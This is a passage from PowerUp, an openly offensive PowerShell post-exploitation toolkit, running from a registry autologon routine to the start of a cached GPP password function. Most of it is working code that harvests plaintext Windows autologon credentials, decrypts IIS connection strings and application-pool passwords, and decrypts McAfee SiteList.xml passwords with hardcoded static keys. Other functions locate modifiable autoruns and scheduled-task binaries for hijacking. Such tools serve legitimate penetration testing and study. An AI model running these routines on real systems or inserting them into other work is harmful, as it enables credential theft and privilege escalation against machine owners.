https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/windows_autologin.rb
#>

    [OutputType('PowerUp.RegistryAutoLogon')]
    [CmdletBinding()]
    Param()

    $AutoAdminLogon = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue)
    Write-Verbose "AutoAdminLogon key: $($AutoAdminLogon.AutoAdminLogon)"

    if ($AutoAdminLogon -and ($AutoAdminLogon.AutoAdminLogon -ne 0)) {

        $DefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
        $DefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
        $DefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
        $AltDefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
        $AltDefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
        $AltDefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword

        if ($DefaultUserName -or $AltDefaultUserName) {
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'DefaultDomainName' $DefaultDomainName
            $Out | Add-Member Noteproperty 'DefaultUserName' $DefaultUserName
            $Out | Add-Member Noteproperty 'DefaultPassword' $DefaultPassword
            $Out | Add-Member Noteproperty 'AltDefaultDomainName' $AltDefaultDomainName
            $Out | Add-Member Noteproperty 'AltDefaultUserName' $AltDefaultUserName
            $Out | Add-Member Noteproperty 'AltDefaultPassword' $AltDefaultPassword
            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.RegistryAutoLogon')
            $Out
        }
    }
}

function Get-ModifiableRegistryAutoRun {
<#
.SYNOPSIS

Returns any elevated system autoruns in which the current user can
modify part of the path string.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-ModifiablePath  

.DESCRIPTION

Enumerates a number of autorun specifications in HKLM and filters any
autoruns through Get-ModifiablePath, returning any file/config locations
in the found path strings that the current user can modify.

.EXAMPLE

Get-ModifiableRegistryAutoRun

Return vulneable autorun binaries (or associated configs).

.OUTPUTS

PowerUp.ModifiableRegistryAutoRun

Custom PSObject containing results.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiableRegistryAutoRun')]
    [CmdletBinding()]
    Param()

    $SearchLocations = @(   "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService"
                        )

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {

        $Keys = Get-Item -Path $_
        $ParentPath = $_

        ForEach ($Name in $Keys.GetValueNames()) {

            $Path = $($Keys.GetValue($Name))

            $Path | Get-ModifiablePath | ForEach-Object {
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'Key' "$ParentPath\$Name"
                $Out | Add-Member Noteproperty 'Path' $Path
                $Out | Add-Member Noteproperty 'ModifiableFile' $_
                $Out | Add-Member Aliasproperty Name Key
                $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableRegistryAutoRun')
                $Out
            }
        }
    }

    $ErrorActionPreference = $OrigError
}


########################################################
#
# Miscellaneous checks
#
########################################################

function Get-ModifiableScheduledTaskFile {
<#
.SYNOPSIS

Returns scheduled tasks where the current user can modify any file
in the associated task action string.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-ModifiablePath  

.DESCRIPTION

Enumerates all scheduled tasks by recursively listing "$($ENV:windir)\System32\Tasks"
and parses the XML specification for each task, extracting the command triggers.
Each trigger string is filtered through Get-ModifiablePath, returning any file/config
locations in the found path strings that the current user can modify.

.EXAMPLE

Get-ModifiableScheduledTaskFile

Return scheduled tasks with modifiable command strings.

.OUTPUTS

PowerUp.ModifiableScheduledTaskFile

Custom PSObject containing results.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiableScheduledTaskFile')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $Path = "$($ENV:windir)\System32\Tasks"

    # recursively enumerate all schtask .xmls
    Get-ChildItem -Path $Path -Recurse | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
        try {
            $TaskName = $_.Name
            $TaskXML = [xml] (Get-Content $_.FullName)
            if ($TaskXML.Task.Triggers) {

                $TaskTrigger = $TaskXML.Task.Triggers.OuterXML

                # check schtask command
                $TaskXML.Task.Actions.Exec.Command | Get-ModifiablePath | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                    $Out | Add-Member Aliasproperty Name TaskName
                    $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableScheduledTaskFile')
                    $Out
                }

                # check schtask arguments
                $TaskXML.Task.Actions.Exec.Arguments | Get-ModifiablePath | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                    $Out | Add-Member Aliasproperty Name TaskName
                    $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableScheduledTaskFile')
                    $Out
                }
            }
        }
        catch {
            Write-Verbose "Error: $_"
        }
    }
    $ErrorActionPreference = $OrigError
}


function Get-ScheduledTasks {
<#
.SYNOPSIS

Uses schtasks.exe to enumerate all configured scheduled tasks on the system.

Author: Tobias Neitzel (@qtc-de)
License: BSD 3-Clause
Required Dependencies: None

.EXAMPLE

Get-ScheduledTasks 

HostName                             : MSEDGEWIN10
TaskName                             : \OneDrive Standalone Update Task-S-1-5-21-3461203602-4096304019-2269080069-1000
Next Run Time                        : 4/16/2020 5:58:30 PM
Status                               : Ready
Logon Mode                           : Interactive only
Last Run Time                        : 4/15/2020 7:07:35 AM
[...]

Finds all available scheduled tasks.

.OUTPUTS

PowerUp.ScheduledTask

Array of PowerUp.ScheduledTask objects
#>
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ScheduledTask')]
    [CmdletBinding()]
    Param()

    $TmpFile = New-TemporaryFile

    try {
        schtasks.exe /query /fo CSV /v > $TmpFile
        $Tasks = Import-Csv $TmpFile
    } catch {
        Write-Verbose "Error enumerating scheduled tasks using schtasks.exe"
        Write-Verbose $_
        return
    }

    ForEach($Task in $Tasks) {

        if( $Task.Taskname -eq "TaskName" ) {
            continue;
        }

        $Task.PSObject.TypeNames.Insert(0, 'PowerUp.ScheduledTask')
        $Task
    }
}


function Get-ModifiableScheduledTaskFile2 {
<#
.SYNOPSIS

Takes an array of PowerUp.ScheduledTask objects an checks whether components of the
executable path are modifiable by the current user.

Author: Tobias Neitzel (@qtc-de)
License: BSD 3-Clause
Required Dependencies: None

.EXAMPLE

Get-ScheduledTasks | Get-ModifiableScheduledTaskFile2

HostName                             : MSEDGEWIN10
TaskName                             : \OneDrive Standalone Update Task-S-1-5-21-3461203602-4096304019-2269080069-1000
Next Run Time                        : 4/16/2020 8:19:37 PM
Status                               : Ready
Logon Mode                           : Interactive only
ModifiablePath                       : @{ModifiablePath=C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe}
[...]

Finds all scheduled tasks that contain modifiable components inside their execute path.

.OUTPUTS

PowerUp.ScheduledTask
#>
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ScheduledTask')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [PSObject[]]
        $ScheduledTask
    )
    
    PROCESS {

        ForEach($Task in $ScheduledTask) {
        
            $ExecPath = $Task.'Task To Run'
            if( ($ExecPath -eq $null) -or ($ExecPath -eq "") -or ($ExecPath -eq "COM handler") ) {
                Write-Verbose "Skipping: $($Task.TaskName) [No Exec Path]"
                continue
            }

            $Count = 0
            $ExecPath | Get-ModifiablePath | ForEach-Object {
                $Count += 1
                $Task | Add-Member Noteproperty "ModifiablePath$Count" $_
            }
            if( $Task.ModifiablePath1 -ne $Null ) {
                $Task
            }
        }
    }
}   


function Get-UnattendedInstallFile {
<#
.SYNOPSIS

Checks several locations for remaining unattended installation files,
which may have deployment credentials.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.EXAMPLE

Get-UnattendedInstallFile

Finds any remaining unattended installation files.

.LINK

http://www.fuzzysecurity.com/tutorials/16.html

.OUTPUTS

PowerUp.UnattendedInstallFile

Custom PSObject containing results.
#>
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.UnattendedInstallFile')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $SearchLocations = @(   "c:\sysprep\sysprep.xml",
                            "c:\sysprep\sysprep.inf",
                            "c:\sysprep.inf",
                            (Join-Path $Env:WinDir "\Panther\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\Panther\unattend.xml")
                        )

    # test the existence of each path and return anything found
    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'UnattendPath' $_
        $Out | Add-Member Aliasproperty Name UnattendPath
        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.UnattendedInstallFile')
        $Out
    }

    $ErrorActionPreference = $OrigError
}


function Get-WebConfig {
<#
.SYNOPSIS

This script will recover cleartext and encrypted connection strings from all web.config
files on the system. Also, it will decrypt them if needed.

Author: Scott Sutherland, Antti Rantasaari  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This script will identify all of the web.config files on the system and recover the
connection strings used to support authentication to backend databases.  If needed, the
script will also decrypt the connection strings on the fly.  The output supports the
pipeline which can be used to convert all of the results into a pretty table by piping
to format-table.

.EXAMPLE

Return a list of cleartext and decrypted connect strings from web.config files.

Get-WebConfig

user   : s1admin
pass   : s1password
dbserv : 192.168.1.103\server1
vdir   : C:\test2
path   : C:\test2\web.config
encr   : No

user   : s1user
pass   : s1password
dbserv : 192.168.1.103\server1
vdir   : C:\inetpub\wwwroot
path   : C:\inetpub\wwwroot\web.config
encr   : Yes

.EXAMPLE

Return a list of clear text and decrypted connect strings from web.config files.

Get-WebConfig | Format-Table -Autosize

user    pass       dbserv                vdir               path                          encr
----    ----       ------                ----               ----                          ----
s1admin s1password 192.168.1.101\server1 C:\App1            C:\App1\web.config            No
s1user  s1password 192.168.1.101\server1 C:\inetpub\wwwroot C:\inetpub\wwwroot\web.config No
s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\test\web.config       No
s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\web.config            Yes
s3user  s3password 192.168.1.103\server3 D:\App3            D:\App3\web.config            No

.OUTPUTS

System.Boolean

System.Data.DataTable

.LINK

https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
http://www.netspi.com
https://raw2.github.com/NetSPI/cmdsql/master/cmdsql.aspx
http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx

.NOTES

Below is an alterantive method for grabbing connection strings, but it doesn't support decryption.
for /f "tokens=*" %i in ('%systemroot%\system32\inetsrv\appcmd.exe list sites /text:name') do %systemroot%\system32\inetsrv\appcmd.exe list config "%i" -section:connectionstrings

Author: Scott Sutherland - 2014, NetSPI
Author: Antti Rantasaari - 2014, NetSPI
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingInvokeExpression', '')]
    [OutputType('System.Boolean')]
    [OutputType('System.Data.DataTable')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\InetSRV\appcmd.exe")) {

        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add('user')
        $Null = $DataTable.Columns.Add('pass')
        $Null = $DataTable.Columns.Add('dbserv')
        $Null = $DataTable.Columns.Add('vdir')
        $Null = $DataTable.Columns.Add('path')
        $Null = $DataTable.Columns.Add('encr')

        # Get list of virtual directories in IIS
        C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath |
        ForEach-Object {

            $CurrentVdir = $_

            # Converts CMD style env vars (%) to powershell env vars (env)
            if ($_ -like "*%*") {
                $EnvarName = "`$Env:"+$_.split("%")[1]
                $EnvarValue = Invoke-Expression $EnvarName
                $RestofPath = $_.split('%')[2]
                $CurrentVdir  = $EnvarValue+$RestofPath
            }

            # Search for web.config files in each virtual directory
            $CurrentVdir | Get-ChildItem -Recurse -Filter web.config | ForEach-Object {

                # Set web.config path
                $CurrentPath = $_.fullname

                # Read the data from the web.config xml file
                [xml]$ConfigFile = Get-Content $_.fullname

                # Check if the connectionStrings are encrypted
                if ($ConfigFile.configuration.connectionStrings.add) {

                    # Foreach connection string add to data table
                    $ConfigFile.configuration.connectionStrings.add|
                    ForEach-Object {

                        [String]$MyConString = $_.connectionString
                        if ($MyConString -like '*password*') {
                            $ConfUser = $MyConString.Split('=')[3].Split(';')[0]
                            $ConfPass = $MyConString.Split('=')[4].Split(';')[0]
                            $ConfServ = $MyConString.Split('=')[1].Split(';')[0]
                            $ConfVdir = $CurrentVdir
                            $ConfEnc = 'No'
                            $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)
                        }
                    }
                }
                else {

                    # Find newest version of aspnet_regiis.exe to use (it works with older versions)
                    $AspnetRegiisPath = Get-ChildItem -Path "$Env:SystemRoot\Microsoft.NET\Framework\" -Recurse -filter 'aspnet_regiis.exe'  | Sort-Object -Descending | Select-Object fullname -First 1

                    # Check if aspnet_regiis.exe exists
                    if (Test-Path  ($AspnetRegiisPath.FullName)) {

                        # Setup path for temp web.config to the current user's temp dir
                        $WebConfigPath = (Get-Item $Env:temp).FullName + '\web.config'

                        # Remove existing temp web.config
                        if (Test-Path  ($WebConfigPath)) {
                            Remove-Item $WebConfigPath
                        }

                        # Copy web.config from vdir to user temp for decryption
                        Copy-Item $CurrentPath $WebConfigPath

                        # Decrypt web.config in user temp
                        $AspnetRegiisCmd = $AspnetRegiisPath.fullname+' -pdf "connectionStrings" (get-item $Env:temp).FullName'
                        $Null = Invoke-Expression $AspnetRegiisCmd

                        # Read the data from the web.config in temp
                        [xml]$TMPConfigFile = Get-Content $WebConfigPath

                        # Check if the connectionStrings are still encrypted
                        if ($TMPConfigFile.configuration.connectionStrings.add) {

                            # Foreach connection string add to data table
                            $TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {

                                [String]$MyConString = $_.connectionString
                                if ($MyConString -like '*password*') {
                                    $ConfUser = $MyConString.Split('=')[3].Split(';')[0]
                                    $ConfPass = $MyConString.Split('=')[4].Split(';')[0]
                                    $ConfServ = $MyConString.Split('=')[1].Split(';')[0]
                                    $ConfVdir = $CurrentVdir
                                    $ConfEnc = 'Yes'
                                    $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)
                                }
                            }
                        }
                        else {
                            Write-Verbose "Decryption of $CurrentPath failed."
                            $False
                        }
                    }
                    else {
                        Write-Verbose 'aspnet_regiis.exe does not exist in the default location.'
                        $False
                    }
                }
            }
        }

        # Check if any connection strings were found
        if ( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable | Sort-Object user,pass,dbserv,vdir,path,encr | Select-Object user,pass,dbserv,vdir,path,encr -Unique
        }
        else {
            Write-Verbose 'No connection strings found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}


function Get-ApplicationHost {
<#
.SYNOPSIS

Recovers encrypted application pool and virtual directory passwords from the applicationHost.config on the system.

Author: Scott Sutherland  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This script will decrypt and recover application pool and virtual directory passwords
from the applicationHost.config file on the system.  The output supports the
pipeline which can be used to convert all of the results into a pretty table by piping
to format-table.

.EXAMPLE

Return application pool and virtual directory passwords from the applicationHost.config on the system.

Get-ApplicationHost

user    : PoolUser1
pass    : PoolParty1!
type    : Application Pool
vdir    : NA
apppool : ApplicationPool1
user    : PoolUser2
pass    : PoolParty2!
type    : Application Pool
vdir    : NA
apppool : ApplicationPool2
user    : VdirUser1
pass    : VdirPassword1!
type    : Virtual Directory
vdir    : site1/vdir1/
apppool : NA
user    : VdirUser2
pass    : VdirPassword2!
type    : Virtual Directory
vdir    : site2/
apppool : NA

.EXAMPLE

Return a list of cleartext and decrypted connect strings from web.config files.

Get-ApplicationHost | Format-Table -Autosize

user          pass               type              vdir         apppool
----          ----               ----              ----         -------
PoolUser1     PoolParty1!       Application Pool   NA           ApplicationPool1
PoolUser2     PoolParty2!       Application Pool   NA           ApplicationPool2
VdirUser1     VdirPassword1!    Virtual Directory  site1/vdir1/ NA
VdirUser2     VdirPassword2!    Virtual Directory  site2/       NA

.OUTPUTS

System.Data.DataTable

System.Boolean

.LINK

https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
http://www.netspi.com
http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx

.NOTES

Author: Scott Sutherland - 2014, NetSPI
Version: Get-ApplicationHost v1.0
Comments: Should work on IIS 6 and Above
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingInvokeExpression', '')]
    [OutputType('System.Data.DataTable')]
    [OutputType('System.Boolean')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add('user')
        $Null = $DataTable.Columns.Add('pass')
        $Null = $DataTable.Columns.Add('type')
        $Null = $DataTable.Columns.Add('vdir')
        $Null = $DataTable.Columns.Add('apppool')

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if ( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}


function Get-SiteListPassword {
<#
.SYNOPSIS

Retrieves the plaintext passwords for found McAfee's SiteList.xml files.
Based on Jerome Nokin (@funoverip)'s Python solution (in links).

Author: Jerome Nokin (@funoverip)  
PowerShell Port: @harmj0y  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Searches for any McAfee SiteList.xml in C:\Program Files\, C:\Program Files (x86)\,
C:\Documents and Settings\, or C:\Users\. For any files found, the appropriate
credential fields are extracted and decrypted using the internal Get-DecryptedSitelistPassword
function that takes advantage of McAfee's static key encryption. Any decrypted credentials
are output in custom objects. See links for more information.

.PARAMETER Path

Optional path to a SiteList.xml file or folder.

.EXAMPLE

Get-SiteListPassword

EncPassword : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
UserName    :
Path        : Products/CommonUpdater
Name        : McAfeeHttp
DecPassword : MyStrongPassword!
Enabled     : 1
DomainName  :
Server      : update.nai.com:80

EncPassword : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
UserName    : McAfeeService
Path        : Repository$
Name        : Paris
DecPassword : MyStrongPassword!
Enabled     : 1
DomainName  : companydomain
Server      : paris001

EncPassword : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
UserName    : McAfeeService
Path        : Repository$
Name        : Tokyo
DecPassword : MyStrongPassword!
Enabled     : 1
DomainName  : companydomain
Server      : tokyo000

.OUTPUTS

PowerUp.SiteListPassword

.LINK

https://github.com/funoverip/mcafee-sitelist-pwd-decryption/
https://funoverip.net/2016/02/mcafee-sitelist-xml-password-decryption/
https://github.com/tfairane/HackStory/blob/master/McAfeePrivesc.md
https://www.syss.de/fileadmin/dokumente/Publikationen/2011/SySS_2011_Deeg_Privilege_Escalation_via_Antivirus_Software.pdf
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.SiteListPassword')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String[]]
        $Path
    )

    BEGIN {
        function Local:Get-DecryptedSitelistPassword {
            # PowerShell adaptation of https://github.com/funoverip/mcafee-sitelist-pwd-decryption/
            # Original Author: Jerome Nokin (@funoverip / jerome.nokin@gmail.com)
            # port by @harmj0y
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
            [CmdletBinding()]
            Param(
                [Parameter(Mandatory = $True)]
                [String]
                $B64Pass
            )

            # make sure the appropriate assemblies are loaded
            Add-Type -Assembly System.Security
            Add-Type -Assembly System.Core

            # declare the encoding/crypto providers we need
            $Encoding = [System.Text.Encoding]::ASCII
            $SHA1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider
            $3DES = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider

            # static McAfee key XOR key LOL
            $XORKey = 0x12,0x15,0x0F,0x10,0x11,0x1C,0x1A,0x06,0x0A,0x1F,0x1B,0x18,0x17,0x16,0x05,0x19

            # xor the input b64 string with the static XOR key
            $I = 0;
            $UnXored = [System.Convert]::FromBase64String($B64Pass) | Foreach-Object { $_ -BXor $XORKey[$I++ % $XORKey.Length] }

            # build the static McAfee 3DES key TROLOL
            $3DESKey = $SHA1.ComputeHash($Encoding.GetBytes('<!@#$%^>')) + ,0x00*4

            # set the options we need
            $3DES.Mode = 'ECB'
            $3DES.Padding = 'None'
            $3DES.Key = $3DESKey

            # decrypt the unXor'ed block
            $Decrypted = $3DES.CreateDecryptor().TransformFinalBlock($UnXored, 0, $UnXored.Length)

            # ignore the padding for the result
            $Index = [Array]::IndexOf($Decrypted, [Byte]0)
            if ($Index -ne -1) {
                $DecryptedPass = $Encoding.GetString($Decrypted[0..($Index-1)])
            }
            else {
                $DecryptedPass = $Encoding.GetString($Decrypted)
            }

            New-Object -TypeName PSObject -Property @{'Encrypted'=$B64Pass;'Decrypted'=$DecryptedPass}
        }

        function Local:Get-SitelistField {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
            [CmdletBinding()]
            Param(
                [Parameter(Mandatory = $True)]
                [String]
                $Path
            )

            try {
                [Xml]$SiteListXml = Get-Content -Path $Path

                if ($SiteListXml.InnerXml -Like "*password*") {
                    Write-Verbose "Potential password in found in $Path"

                    $SiteListXml.SiteLists.SiteList.ChildNodes | Foreach-Object {
                        try {
                            $PasswordRaw = $_.Password.'#Text'

                            if ($_.Password.Encrypted -eq 1) {
                                # decrypt the base64 password if it's marked as encrypted
                                $DecPassword = if ($PasswordRaw) { (Get-DecryptedSitelistPassword -B64Pass $PasswordRaw).Decrypted } else {''}
                            }
                            else {
                                $DecPassword = $PasswordRaw
                            }

                            $Server = if ($_.ServerIP) { $_.ServerIP } else { $_.Server }
                            $Path = if ($_.ShareName) { $_.ShareName } else { $_.RelativePath }

                            $ObjectProperties = @{
                                'Name' = $_.Name;
                                'Enabled' = $_.Enabled;
                                'Server' = $Server;
                                'Path' = $Path;
                                'DomainName' = $_.DomainName;
                                'UserName' = $_.UserName;
                                'EncPassword' = $PasswordRaw;
                                'DecPassword' = $DecPassword;
                            }
                            $Out = New-Object -TypeName PSObject -Property $ObjectProperties
                            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.SiteListPassword')
                            $Out
                        }
                        catch {
                            Write-Verbose "Error parsing node : $_"
                        }
                    }
                }
            }
            catch {
                Write-Warning "Error parsing file '$Path' : $_"
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters['Path']) {
            $XmlFilePaths = $Path
        }
        else {
            $XmlFilePaths = @('C:\Program Files\','C:\Program Files (x86)\','C:\Documents and Settings\','C:\Users\')
        }

        $XmlFilePaths | Foreach-Object { Get-ChildItem -Path $_ -Recurse -Include 'SiteList.xml' -ErrorAction SilentlyContinue } | Where-Object { $_ } | Foreach-Object {
            Write-Verbose "Parsing SiteList.xml file '$($_.Fullname)'"
            Get-SitelistField -Path $_.Fullname
        }
    }
}


function Get-CachedGPPPassword {
<#
.SYNOPSIS

Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences and
left in cached files on the host.

Author: Chris Campbell (@obscuresec)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Get-CachedGPPPassword searches the local machine for cached for groups.xml, scheduledtasks.xml, services.xml and
datasources.xml files and returns plaintext passwords.

.EXAMPLE

Get-CachedGPPPassword

NewName   : [BLANK]
Changed   : {2013-04-25 18:36:07}
Passwords : {Super!!!Password}
UserNames : {SuperSecretBackdoor}
File      : C:\ProgramData\Microsoft\Group Policy\History\{32C4C89F-7
            C3A-4227-A61D-8EF72B5B9E42}\Machine\Preferences\Groups\Gr
            oups.xml

.LINK

http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb
